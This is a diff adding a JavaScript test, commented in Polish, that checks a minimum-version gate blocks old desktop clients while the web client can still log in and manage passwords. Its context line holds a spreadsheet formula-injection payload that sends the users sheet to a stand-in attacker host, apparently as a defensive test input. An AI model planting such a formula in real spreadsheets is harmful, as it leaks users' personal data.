@@ -283,4 +283,17 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   B.blokada.zajety = false;
   ok('gdy blokada wolna, wszystko działa jak dotąd', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok' && B.blokada.zwolnien === zw + 1);
 }
+/* ---- 13. bramka WYMAGANA_WERSJA odcina stare programy, ale nie aplikację web (stały numer silnika 3.24.0 + klient: "web") ---- */
+{
+  const B = swiezy({ ustaw: "WYMAGANA_WERSJA = '3.25.0';" }); const W = { klient: 'web', wersja: '3.24.0' };
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  ok('program starszy niż WYMAGANA_WERSJA jest odcinany', /nie jest juz obslugiwana/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', wersja: '3.24.0', zrodlo: 'program' }).opis || ''));
+  ok('program w wymaganej wersji wchodzi', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', wersja: '3.25.1', zrodlo: 'program' }).status === 'ok');
+  const web = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', zrodlo: 'www', ...W }), B.post({ akcja: 'puls', kod: '12345', system: 'Web', ...W }, { haslo: 'haslo123' }), B.post({ akcja: 'haslo_paczki', kod: '12345', ...W }, { haslo: 'haslo123' }),
+    B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'nowehaslo1', ...W }), B.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900', ...W })];
+  ok('aplikacja web (klient: "web") działa przy włączonej bramce: logowanie, puls, hasło paczki, zmiana i reset hasła', web.every(o => o.status === 'ok') && web[1].pelne === true, JSON.stringify(web.map(o => o.status + ':' + (o.opis || ''))));
+  ok('kolumna „Wersja” odróżnia aplikację web od programu (web 3.24.0 zamiast 3.24.0)', B.get('Uzytkownicy').w[1][5] === 'web 3.24.0', B.get('Uzytkownicy').w[1][5]);
+  B.post({ akcja: 'puls', kod: '12345', system: 'Windows', wersja: '3.25.1' }, { haslo: 'nowehaslo1' });
+  ok('program zapisuje swoją wersję bez dopisku', B.get('Uzytkownicy').w[1][5] === '3.25.1', B.get('Uzytkownicy').w[1][5]);
+}
 process.exit(kod);
